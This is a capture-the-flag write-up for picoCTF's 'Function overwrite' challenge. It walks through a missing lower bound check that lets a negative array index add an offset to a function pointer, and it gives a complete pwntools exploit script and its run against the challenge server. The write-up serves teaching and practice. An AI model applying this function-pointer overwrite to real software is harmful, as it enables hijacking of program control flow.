---
title: "Function overwrite"
date: "2025-07-25"
tags: ["picoCTF", "function overwrite", "array indexing"]
---

This exercise gives us a binary and its source code.

```c
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

The program asks for a story and then for 2 numbers:

```c
./vuln                         
Tell me a story and then I'll tell you if you're a 1337 >> blablabla
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
5
6
You've failed this class.   
```

Let's look at the code:

```c
void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```

Looking at that function we can see that:

* Our story is stored in the `story` variable
* Our numbers are stored in `num1` and `num2`
* There is a check for `num1` being lower than 10 and, if it is, it adds the value of `num2` to element `num1` of the `fun` array
* The `check` function is called

So the program gives us control over an index and, worse, it lets us change the content of that element. On top of that, there is an upper bound check but no lower bound check, which lets us pass a negative number.

What happens if we do something like `fun[-4] += 10`? We add `10` to whatever value sits at the address `fun - 16 bytes`.

So, **since `check` is a function pointer stored in memory**, and the code does an addition with `+=`, we can **add a value to the current address in `check`** to redirect the execution flow.

```c
void (*check)(char*, size_t) = hard_checker;
```

Instead of writing the address of `easy_checker` directly, **we compute the difference between `easy_checker` and `hard_checker`** and add that value to `check`. That way `check` ends up pointing at `easy_checker`.

Then, when `check(story, strlen(story))` is called, `easy_checker` runs, and it gives us the flag if the content of `story` adds up to 1337 in hex, that is, the sum of the ASCII values of the characters it holds.

```c
void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}
```

Let's write the script:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("saturn.picoctf.net", 53697)

def main():
    io = conn()

    story = "A" * 19 + "15"
    info(f'Suma Story: {sum(ord(c) for c in story)}')
    
    num1 = (exe.symbols["fun"] - exe.symbols["check"]) // 4
    info(f'Num1: {num1}')
    
    num2 = exe.symbols.easy_checker - exe.symbols.hard_checker
    info(f'Num2: {hex(num2)}')
    
    io.sendlineafter(b'>> ', story)
    io.sendlineafter(b'.', f'{num1}'.encode())
    io.recvline()
    io.sendline(str(num2))
    io.interactive()

if __name__ == "__main__":
    main()

```

Let's try it:

```c
[+] Opening connection to saturn.picoctf.net on port 61719: Done
[*] Suma Story: 1337
[*] Num1: -16
[*] Num2: -0x13a
/home/ub1cu0/Desktop/picoCTF/function_overwrite/solve.py:35: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendlineafter(b'>> ', story)
/home/ub1cu0/Desktop/picoCTF/function_overwrite/solve.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(num2))
[*] Switching to interactive mode
You're 1337. Here's the flag.
picoCTF{SECRETO}
[*] Got EOF while reading in interactive
```

We have the flag!
